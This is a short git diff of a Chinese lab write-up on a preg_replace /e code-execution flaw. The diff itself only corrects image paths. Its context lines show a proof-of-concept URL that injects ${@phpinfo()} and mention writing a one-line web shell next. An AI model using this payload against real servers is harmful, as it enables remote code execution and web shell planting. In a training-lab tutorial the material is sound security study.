@@ -23,7 +23,7 @@ e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则�
 
 首先打开靶场
 
-![1](.\1.png)
+![1](./1.png)
 
 利用 POC 来验证, phpinfo() 成功执行。
 
@@ -31,7 +31,7 @@ e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则�
 /index.php?s=/index/index/xxx/${@phpinfo()}
 ```
 
-![2](.\2.png)
+![2](./2.png)
 
 然后写入一句话
 
